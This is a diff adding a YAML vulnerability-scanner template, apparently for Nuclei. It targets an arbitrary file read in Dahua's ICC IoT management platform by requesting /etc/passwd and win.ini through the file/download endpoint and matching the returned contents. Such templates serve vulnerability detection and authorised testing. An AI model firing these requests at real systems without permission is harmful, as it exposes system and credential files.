@@ -1,0 +1,37 @@
+id: dahua-icc-evo-cirs-fileread
+info:
+  name: 大华智能物联ICC综合管理平台evo-apigw/evo-cirs/file/download接口存在任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 大华ICC智能物联综合管理平台对技术组件进行模块化和松耦合，将解决方案分层分级，提高面向智慧物联的数据接入与生态合作能力。该系统存在任意文件读取漏洞，会造成敏感信息泄露
+  reference: 
+    - https://mp.weixin.qq.com/s/BJiz2NU5xP6g2ix9BefFHg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,dahua.icc
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd"
+      - "{{BaseURL}}/evo-apigw/evo-cirs/file/download?filePath=file://c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
